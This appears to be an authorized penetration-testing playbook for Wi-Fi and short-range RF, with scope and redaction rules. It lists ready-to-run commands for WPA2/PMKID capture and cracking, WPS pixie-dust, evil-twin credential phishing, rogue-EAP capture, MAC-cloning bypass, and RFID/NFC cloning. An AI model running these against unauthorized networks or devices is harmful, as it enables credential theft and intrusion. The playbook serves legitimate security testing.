# Wireless attack reference (Wi-Fi + short-range RF)
# Approval-gated. AUTHORIZED networks/devices only. NO deauth against production. Cracking is OFFLINE.
# REDACT recovered PSKs/PINs/credentials in artifacts. In-scope SSIDs/locations only; don't touch neighbours.

## Survey (passive first)
```
airmon-ng start wlan0                              # monitor mode -> wlan0mon
airodump-ng wlan0mon                               # list SSIDs/BSSIDs/channels/clients in range
bettercap -iface wlan0mon                          # wifi.recon on; map in-scope BSSIDs + associated clients
```
Confirm every BSSID is in RF scope before any active step. Note the band/channel, protocol (WPA2/WPA3/WPS),
and whether client isolation is on.

## WPA2-PSK: handshake capture + offline crack  (the core vector)
Capture the 4-way handshake (or a PMKID) passively; crack OFFLINE. Prefer passive capture; only use a
forced re-association against an APPROVED test client, never production.
```
# PMKID / handshake capture (no client deauth needed for PMKID):
hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1
hcxpcapngtool -o hash.hc22000 capture.pcapng       # convert to hashcat 22000 format
# Classic handshake (aircrack path):
airodump-ng -c <ch> --bssid <BSSID> -w cap wlan0mon
# Offline crack (OFFLINE only):
hashcat -m 22000 hash.hc22000 wordlist.txt         # WPA-PBKDF2-PMKID+EAPOL
aircrack-ng -w wordlist.txt cap-01.cap             # alternative cracker
```
Benign proof: the PSK is recovered offline for a TEST SSID. Redact it.

## WPA3-SAE: transition/downgrade + handshake weaknesses
- WPA3 "transition mode" advertises WPA2 alongside WPA3 for compatibility → a client can be driven onto the
  WPA2 path (capture + crack as above). Test whether the in-scope network runs transition mode.
- The SAE handshake has known side-channel and resource-exhaustion weaknesses: timing/cache
  side-channels during password derivation can leak information about the password, and malformed-commit
  handling can exhaust the AP. Assess AWARENESS/applicability; do not run resource-exhaustion against prod.
Benign proof: show transition-mode is on (downgrade feasible) and/or document SAE side-channel applicability.

## WPS pixie-dust  (offline PIN recovery)
If WPS is enabled, a weak/predictable nonce lets the PIN be recovered offline from a single exchange.
```
wash -i wlan0mon                                   # list WPS-enabled APs (in scope only)
reaver -i wlan0mon -b <BSSID> -K 1 -vv             # pixie-dust mode
bully -b <BSSID> -c <ch> -d wlan0mon               # alternative
```
Benign proof: the WPS PIN (and thus PSK) is recovered. Rate-limit; stop if it disrupts the AP.

## Evil-twin / rogue-AP + captive-portal credential capture
Stand up a look-alike AP for a TEST client to demonstrate association + credential submission.
```
hostapd rogue.conf                                 # broadcast the test SSID on an isolated interface
# captive portal / automated rogue-AP + phishing portal:
wifiphisher                                        # select a scenario; serves a credential-capture page
```
Scope it to a TEST client and benign test credentials; do NOT deauth real clients to drive them over.
Benign proof: the TEST client associated and submitted a benign test credential to the portal. Tear down after.

## WPA-Enterprise: rogue EAP endpoint + credential capture
Against PEAP/EAP without server-certificate validation, a rogue RADIUS/AP endpoint captures the client's
MSCHAPv2 challenge/response for offline cracking.
```
hostapd-wpe wpe.conf                               # rogue AP + RADIUS; logs EAP identities + challenge/response
hashcat -m 5500 captured_netntlm ...               # crack the captured MSCHAPv2 offline
```
Use a benign test identity. The finding is "clients don't validate the server cert" → creds capturable.

## Deauth / disassociation  (AWARENESS — approval only, never on prod)
Deauthentication frames can force clients to reconnect (to recapture a handshake or drive an evil-twin).
This is DISRUPTIVE: **only against an approved, isolated test client, never production**, and never as a
denial-of-service demo. Prefer passive capture or PMKID so deauth is unnecessary.

## Short-range RF (overview — in refs for scoping)
- BLE: enumerate GATT services/characteristics, look for unauthenticated read/write of sensitive values,
  passive sniffing of pairing. Tools: `gatttool`, `bleah`, a BLE sniffer. Benign: read/toggle a non-safety
  characteristic on an authorized device.
- Zigbee: enumerate the PAN, inspect key provisioning (default/transported keys), capture joins. Tool:
  `killerbee` suite. Benign: show a weak/default network-key provisioning on an authorized device.

## Reporting
Each finding: network/device, protocol, the vector, the benign proof (redacted secret), attacker
preconditions (RF proximity, test-client cooperation), and remediation (strong PSK, disable WPS, disable
transition mode, enforce server-cert validation / 802.1X with EAP-TLS, client isolation).

---

## Extended arsenal — PMKID vs full-handshake capture variants + hash-mode notes

| Variant | Needs a client? | Capture | hashcat mode |
|---|---|---|---|
| PMKID (RSN IE in M1) | No (AP-only, clientless) | single assoc attempt to the AP | `-m 22000` (legacy 16800) |
| Full 4-way EAPOL (M1-M4) | Yes | passive, or an approved re-assoc of a TEST client | `-m 22000` (legacy 2500) |
| EAPOL M1 only | partial | M1 also carries the PMKID | `-m 22000` |

```
hcxdumptool -i wlan0mon -o cap.pcapng --enable_status=1     # grabs PMKID + EAPOL; passive-friendly
hcxpcapngtool -o hash.hc22000 cap.pcapng                    # unified 22000 (EAPOL + PMKID)
hcxpcapngtool --all -o hash.hc22000 cap.pcapng              # keep every message pair / PMKID present
hcxpcapngtool -o /dev/null --prefix=info cap.pcapng         # inspect: counts of PMKIDs / EAPOL pairs per BSSID
hashcat -m 22000 hash.hc22000 wordlist.txt -r rules/best64.rule
```
Notes: `-m 22000` supersedes legacy `16800` (PMKID) and `2500` (EAPOL). In the 22000 line, `*01*` = PMKID, `*02*` = EAPOL -- both crack identically. A usable EAPOL capture needs a valid MIC + the right message pair; `--all` preserves nonces/replay counters. PMKID depends on the AP including the RSN PMKID in M1 (not all do). Benign proof: a TEST-SSID PSK recovered OFFLINE (redacted); note whether PMKID made it clientless.

---

## Extended arsenal — WPA3-SAE Dragonblood-class side-channels + downgrade specifics (awareness)
Feasibility/awareness. Side-channel data collection against a TEST AP only; resource-exhaustion is catalogued-not-fired.

| Weakness | Mechanism | Our stance |
|---|---|---|
| Transition-mode downgrade | AP offers WPA3+WPA2 under one SSID -> use WPA2 path, capture+crack | fire vs a TEST AP (offline crack) |
| Group downgrade / negotiation | force a weaker SAE group | assess from beacon/assoc; awareness |
| Timing side-channel (MODP groups) | password-derivation time varies by password | measure vs TEST AP; info-leak feasibility |
| Cache side-channel (hunting-and-pecking) | branch/cache during derivation leaks bits | local/lab feasibility; awareness |
| Malformed/flood commit (DoS) | CPU exhaustion from forged commit frames | AWARENESS ONLY -- never fired on prod |

```
bettercap -iface wlan0mon -eval "wifi.recon on"            # note RSN AKM: SAE vs SAE+PSK (transition mode)
iw dev wlan0 scan | grep -A6 -iE "SSID|RSN|AKM|PMF|SAE"     # AKM suites + group cipher + PMF bit (read-only)
```
If transition mode is on, the WPA2 path is the practical route (handshake/PMKID -> offline crack). Benign proof: show transition mode enabled (downgrade path exists) and/or document SAE side-channel applicability from the negotiated group; do NOT run commit-flood/exhaustion against production.

---

## Extended arsenal — PMF / 802.11w awareness (where deauth fails)
```
iw dev wlan0 scan | grep -iE "RSN|Management Frame Protection|MFPC|MFPR|Capabilities"
# RSN capability bits: MFPC = PMF capable, MFPR = PMF required.
```

| PMF state | Spoofed deauth/disassoc | Implication |
|---|---|---|
| Disabled | works | legacy handshake-recapture (TEST client only) |
| Capable (optional) | protected for PMF clients; legacy clients still exploitable | mixed fleet |
| Required (WPA3 mandates) | mgmt frames authenticated -> spoofed deauth ignored | deauth-driven recapture fails -> use PMKID/passive |

WPA3 requires PMF; WPA2 may enable it. Where PMF is required, deauth-based evil-twin steering and handshake forcing do not work -- prefer clientless PMKID, passive capture, or known-beacon/karma. PMF-off is itself a defensive finding (deauth/DoS exposure). We never fire deauth on production regardless.

---

## Extended arsenal — evil-twin steering variants (TEST client only)
Beacon/response tricks that get a TEST client to associate WITHOUT deauthing real clients.

| Variant | Idea | Tooling |
|---|---|---|
| Karma | answer every directed probe ("yes, I'm that SSID") | hostapd (karma), bettercap wifi module |
| Known-beacons | beacon a list of common/previously-used SSIDs the client auto-joins | hostapd-mana known-beacons |
| MANA | selective karma: respond only to SSIDs each client probes for | hostapd-mana |
| PNL harvest | collect the client's Preferred Network List from probe requests, then impersonate one | airodump / bettercap (passive) |

```
airodump-ng wlan0mon                               # watch the 'Probes' column for the TEST device's PNL
hostapd-mana mana.conf                             # mana=1; enable karma / known-beacons as scoped (isolated iface)
```
Scope strictly to the approved TEST client + a TEST/benign SSID on an isolated interface; do not answer neighbour probes or deauth real clients. Benign proof: the TEST client auto-associated to the rogue via karma/known-beacon (log the association); tear down after.

---

## Extended arsenal — 802.1X MAB bypass + EAP method matrix
```
# MAC Authentication Bypass: a port that falls back to a MAC allow-list is bypassed by cloning an allowed MAC.
# Passively find an allowed device (printer / IP phone / camera), then on an APPROVED test port only:
macchanger -m <ALLOWED-MAC> eth0 ; ip link set eth0 up     # clone an authorized MAC (test port only); revert after
```
EAP method matrix (what a rogue endpoint / passive capture yields):

| EAP method | Server-cert validation | What leaks to a rogue AP |
|---|---|---|
| EAP-MD5 | none | challenge/response -> offline crack (weak) |
| PEAP-MSCHAPv2 | client-config dependent (often off) | MSCHAPv2 challenge/response -> `-m 5500` offline |
| EAP-TTLS/PAP | client-config dependent | inner PAP = cleartext creds if cert unvalidated |
| EAP-GTC | depends | token/OTP/password in inner tunnel if unvalidated |
| EAP-FAST | PAC-based | MSCHAPv2 in tunnel if PAC provisioning abused |
| EAP-TLS | mutual certs (required) | nothing crackable (client cert needed) -- resistant |

```
hostapd-wpe wpe.conf                               # rogue AP+RADIUS; logs identity + challenge/response
hashcat -m 5500 captured_netntlm wordlist.txt      # crack captured MSCHAPv2 offline
asleap -C <challenge> -R <response> -W wordlist.txt  # alternative MSCHAPv2 cracker
```
Finding = "clients don't validate the server cert" (any non-EAP-TLS method then leaks a crackable challenge/response). Benign proof: capture a TEST identity's challenge/response + crack offline (redacted); MAB bypass demonstrated on an approved test port only, MAC reverted.

---

## Extended arsenal — wardriving / survey data hygiene
```
kismet -c wlan0mon                                 # passive multi-band survey -> kismetdb
airodump-ng -w survey --gpsd wlan0mon              # CSV/pcap with GPS fix (gpsd running)
```
Hygiene rules (authorized engagement):
- Passive only while surveying; no association/probing of out-of-scope SSIDs.
- Filter to in-scope BSSIDs/locations immediately; discard neighbour/bystander captures.
- GPS coords + client MACs are sensitive PII -> store encrypted; redact client MACs in the report (OUI-only if needed).
- Never retain full handshakes for out-of-scope networks; purge capture files post-engagement per RoE.
Benign proof: an in-scope coverage map / target-AP inventory; bystander data minimized and redacted.

---

## Extended arsenal — BLE depth (authorized device only)
Read-only enumeration + at most a single authorized replay of a NON-safety characteristic. No writes to safety/actuator state.
```
bluetoothctl                                       # power on; scan on; devices -> find the TEST device MAC
hcitool lescan                                     # discovery of advertising BLE devices
gatttool -b <MAC> --primary                        # list primary services (UUIDs)
gatttool -b <MAC> --characteristics                # list characteristics + handles + properties
gatttool -b <MAC> --char-read -a 0x<handle>        # read a readable characteristic value (read-only)
bettercap -eval "ble.recon on"                     # alt enum: ble.show ; ble.enum <MAC>
```
Weaknesses to assess:

| Area | Check | Weak if |
|---|---|---|
| Pairing | Just Works vs Passkey/OOB; LE Secure Connections vs legacy | Just Works / legacy pairing (MITM-able) |
| Bonding | is the link encrypted/bonded at all | sensitive characteristic readable without bonding |
| Authz | properties allow read/write without auth | unauthenticated write to a control characteristic |
| Privacy | static vs resolvable-random address | static MAC = trackable |
| Sniffing | pairing captured on adv channels 37/38/39 | legacy pairing -> key derivable offline |

```
# Passive sniff: a BLE sniffer dongle hops adv channels 37/38/39 then follows the data channels;
# decode in Wireshark (BLE dissector) to capture a pairing and assess legacy-pairing weakness.
```
Benign proof: enumerate the GATT table and EITHER read an unauthenticated sensitive characteristic, show Just-Works/legacy pairing, OR replay ONE captured non-safety characteristic write back to the authorized device to prove missing auth/anti-replay. Never toggle locks/actuators/medical/safety functions; redact any recovered value/key.

---

## Extended arsenal — RF overview (Zigbee / Z-Wave / LoRa / Sub-GHz / RFID-NFC)
Read-only / benign, authorized device + TEST tokens only. Capture + decode before any transmit; most items are passive.

| Tech | Band | Recon / tooling | Benign proof (authorized) |
|---|---|---|---|
| Zigbee | 2.4 GHz | `killerbee` (zbstumbler/zbdump/zbwireshark), CC2531/ApiMote | capture a join; show default/transported network-key provisioning |
| Z-Wave | ~868/908 MHz | SDR + `scapy-radio`, EZ-Wave | enumerate nodes; show S0 default-key / unencrypted frames |
| LoRa / LoRaWAN | 433/868/915 MHz | SDR + gateway/decoder, LoRaWAN analyzers | capture join-request/accept; assess ABP static keys / nonce reuse |
| Sub-GHz (ISM) | 315/433/868/915 MHz | `rtl_433`, HackRF + `gqrx`, `urh` (Universal Radio Hacker) | decode a TEST remote; static code (no rolling code) = replayable |
| RFID LF | 125 kHz | Proxmark3 (`lf search`, `lf hid read`) | read a TEST card ID; clone to a blank TEST tag |
| NFC / RFID HF | 13.56 MHz | `libnfc` (`nfc-list`), Proxmark3 (`hf search`, `hf mf`) | read a TEST MIFARE card; default-key / clone of a TEST credential |

```
rtl_433 -A                                         # auto-decode common 433/868 MHz ISM devices (passive)
urh                                                # capture, demodulate + analyze an unknown sub-GHz signal
nfc-list                                           # enumerate a presented TEST NFC tag (read-only)
# Proxmark3: lf search / hf search to identify, then read/clone a TEST card only.
```
Scope: capture/decode is passive and safe; cloning/replay only on a TEST card/remote you were issued. Zigbee/Z-Wave/LoRa transmit + any actuation is APPROVAL-GATED and catalogued-not-fired on production. Benign proof: a decoded signal / default-key capture / TEST-card clone (redact IDs/keys to fingerprints). No jamming/DoS.
